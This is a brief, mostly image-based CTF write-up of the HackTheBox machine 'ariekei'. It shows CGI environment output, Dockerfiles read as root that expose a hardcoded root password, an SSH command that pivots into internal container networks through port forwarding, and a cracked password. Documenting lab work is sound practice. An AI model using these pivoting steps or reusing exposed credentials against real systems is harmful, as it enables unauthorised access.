# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/afRd6Ii.jpeg)
![](https://i.imgur.com/XC4od79.png)

`Subject Alternative Name: DNS:calvin.ariekei.htb, DNS:beehive.ariekei.htb`
![](https://i.imgur.com/r4Igscj.png)
`ASCII Art credit to David Laundra`
![](https://i.imgur.com/5AcOUOs.png)
![](https://i.imgur.com/IC8YIop.png)
```shell
Sat Jun 1 07:11:46 UTC 2024
07:11:46 up 9:48, 0 users, load average: 0.10, 0.05, 0.01
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2011 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later  This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.
Environment Variables:

SERVER_SIGNATURE=

Apache/2.2.22 (Debian) Server at ariekei.htb Port 80

HTTP_SEC_FETCH_DEST=document
HTTP_SEC_FETCH_USER=?1
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
HTTP_X_FORWARDED_FOR=10.10.14.36
SERVER_PORT=80
HTTP_HOST=ariekei.htb
HTTP_X_REAL_IP=10.10.14.36
DOCUMENT_ROOT=/home/spanishdancer/content
SCRIPT_FILENAME=/usr/lib/cgi-bin/stats
REQUEST_URI=/cgi-bin/stats
SCRIPT_NAME=/cgi-bin/stats
HTTP_SEC_CH_UA_MOBILE=?0
HTTP_CONNECTION=close
REMOTE_PORT=47918
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HTTP_SEC_CH_UA="Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
PWD=/usr/lib/cgi-bin
SERVER_ADMIN=webmaster@localhost
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.9
HTTP_PRIORITY=u=0, i
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
HTTP_DNT=1
REMOTE_ADDR=172.24.0.1
SHLVL=1
SERVER_NAME=ariekei.htb
HTTP_SEC_CH_UA_PLATFORM="Linux"
SERVER_SOFTWARE=Apache/2.2.22 (Debian)
HTTP_SEC_FETCH_MODE=navigate
QUERY_STRING=
SERVER_ADDR=172.24.0.2
GATEWAY_INTERFACE=CGI/1.1
HTTP_UPGRADE_INSECURE_REQUESTS=1
SERVER_PROTOCOL=HTTP/1.0
HTTP_ACCEPT_ENCODING=gzip, deflate, br
HTTP_SEC_FETCH_SITE=none
REQUEST_METHOD=GET
_=/usr/bin/env
```
![](https://i.imgur.com/ckbYkQO.png)
### Gaining Access
![](https://i.imgur.com/Eko2McQ.png)

## Internal
### Enumeration
![](https://i.imgur.com/8YvHajG.png)
```shell
[root@calvin network]# cat make_nets.sh
cat make_nets.sh
#!/bin/bash

# Create isolated network for building containers. No internet access
docker network create -d bridge --subnet=172.24.0.0/24 --gateway=172.24.0.1 --ip-range=172.24.0.0/24 \
 -o com.docker.network.bridge.enable_ip_masquerade=false \
  arieka-test-net

# Crate network for live containers. Internet access
docker network create -d bridge --subnet=172.23.0.0/24 --gateway=172.23.0.1 --ip-range=172.23.0.0/24 \
 arieka-live-net
```
- I tried to ssh with port `22` and `1022` , with the key and i got in.
```shell
[root@calvin bastion-live]# cat Dockerfile
cat Dockerfile
FROM rastasheep/ubuntu-sshd
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
RUN mkdir -p /root/.ssh
RUN echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka" > /root/.ssh/authorized_keys
RUN mkdir /common

docker run \
-v /dev/null:/root/.sh_history \
-v /dev/null:/root/.bash_history \
--restart on-failure:5 \
--net arieka-live-net --ip 172.23.0.253 \
-h ezra.ariekei.htb --name bastion-live -dit \
-v /opt/docker:/common:ro \
-v $(pwd)/sshd_config:/etc/ssh/sshd_config:ro \
-p 1022:22 bastion-template

docker network connect --ip 172.24.0.253 arieka-test-net bastion-live

[root@calvin blog-test]# cat Dockerfile
cat Dockerfile
FROM internal_htb/docker-apache
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
RUN apt-get update
RUN apt-get install python -y
RUN mkdir /common
```
### Gaining Access
```shell
rexder@HunterMachine ~/C/H/M/ariekei [127]> ssh root@10.10.10.65 -p 1022 -i id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -L 8001:172.24.0.2:80 -R 8002:127.0.0.1:8003
Last login: Mon Nov 13 15:20:19 2017 from 10.10.14.2
root@ezra:~#
```
![](https://i.imgur.com/QhGTbct.png)
![](https://i.imgur.com/2mtp1Qq.png)
` spanishdance : purple1 `
### Maintaining Access


# Random Notes